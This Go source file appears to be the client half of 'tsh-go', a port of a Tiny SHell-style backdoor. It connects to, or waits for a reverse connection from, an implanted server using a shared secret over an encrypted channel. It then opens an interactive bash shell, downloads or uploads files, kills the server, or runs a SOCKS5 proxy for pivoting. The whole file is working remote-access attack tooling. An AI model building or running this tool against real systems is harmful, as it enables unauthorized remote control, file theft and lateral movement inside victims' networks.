package client

import (
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	terminal "golang.org/x/term"
)

func Run(secret []byte, host string, port int, socks5addr string, mode uint8, args []string) {
	var isConnectBack bool
	var srcfile, dstdir, command string

	if host == "cb" {
		isConnectBack = true
	}
	command = "exec bash --login"
	if mode == constants.RunShell && len(args) > 0 {
		command = args[0]
	}
	if mode == constants.GetFile && len(args) >= 2 {
		srcfile = args[0]
		dstdir = args[1]
	}
	if mode == constants.PutFile && len(args) >= 2 {
		srcfile = args[0]
		dstdir = args[1]
	}

	waitForConnection := func() *pel.PktEncLayer {
		if isConnectBack {
			// connect back mode
			addr := fmt.Sprintf(":%d", port)
			ln, err := pel.Listen(addr, secret, false)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Print("Waiting for the server to connect...")
			layer, err := ln.Accept()
			ln.Close()
			if err != nil {
				fmt.Println("\nFailed to accept connection.")
				os.Exit(1)
			}
			fmt.Println("connected.")
			layer.Write([]byte{mode})
			return layer
		} else {
			addr := fmt.Sprintf("%s:%d", host, port)
			layer, err := pel.Dial(addr, secret, false)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Failed to connect to %s:%d\n", host, port)
				fmt.Fprintf(os.Stderr, "It is possible that the server is not running or the secret is incorrect.\n")
				os.Exit(0)
			}
			layer.Write([]byte{mode})
			return layer
		}
	}
	switch mode {
	case constants.Kill:
		layer := waitForConnection()
		layer.Close()
		fmt.Println("Server killed.")
	case constants.RunShell:
		handleRunShell(waitForConnection, command)
	case constants.GetFile:
		handleGetFile(waitForConnection, srcfile, dstdir)
	case constants.PutFile:
		handlePutFile(waitForConnection, srcfile, dstdir)
	case constants.SOCKS5:
		handleSocks5(waitForConnection, socks5addr)
	}

}

func handleGetFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir string) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)

	basename := strings.ReplaceAll(srcfile, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	f, err := os.OpenFile(filepath.Join(dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, err = layer.Write([]byte(srcfile))
	if err != nil {
		return
	}
	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
	)
	utils.CopyBuffer(io.MultiWriter(f, bar), layer, buffer)
	fmt.Print("\nDone.\n")
}

func handlePutFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir string) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)
	f, err := os.Open(srcfile)
	if err != nil {
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return
	}
	fsize := fi.Size()

	basename := filepath.Base(srcfile)
	basename = strings.ReplaceAll(basename, "\\", "_")
	_, err = layer.Write([]byte(dstdir + "/" + basename))
	if err != nil {
		fmt.Println(err)
		return
	}
	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
	)
	utils.CopyBuffer(io.MultiWriter(layer, bar), f, buffer)
	fmt.Print("\nDone.\n")
}

func handleRunShell(waitForConnection func() *pel.PktEncLayer, command string) {
	layer := waitForConnection()
	defer layer.Close()
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	_, err = layer.Write([]byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	_, err = layer.Write([]byte(command))
	if err != nil {
		return
	}

	buffer := make([]byte, constants.MaxMessagesize)
	buffer2 := make([]byte, constants.MaxMessagesize)
	go func() {
		_, _ = utils.CopyBuffer(os.Stdout, layer, buffer)
		layer.Close()
	}()
	_, _ = utils.CopyBuffer(layer, os.Stdin, buffer2)
}
func handleSocks5(waitForConnection func() *pel.PktEncLayer, socks5addr string) {
	addr, err := net.ResolveTCPAddr("tcp", socks5addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Println("Socks5 proxy listening at", l.Addr())
	for {
		conn, err := l.Accept()
		if err != nil {
			panic(err)
		}
		layer := waitForConnection()
		fmt.Println("Connection established", conn.RemoteAddr())
		wg := &sync.WaitGroup{}
		wg.Add(2)
		go func() {
			utils.StreamPipe(layer, conn, make([]byte, 1024))
			wg.Done()
		}()
		go func() {
			utils.StreamPipe(conn, layer, make([]byte, 1024))
			wg.Done()
		}()
		go func() {
			wg.Wait()
			layer.Close()
			conn.Close()
			fmt.Println("Connection closed", conn.RemoteAddr())
		}()
	}
}
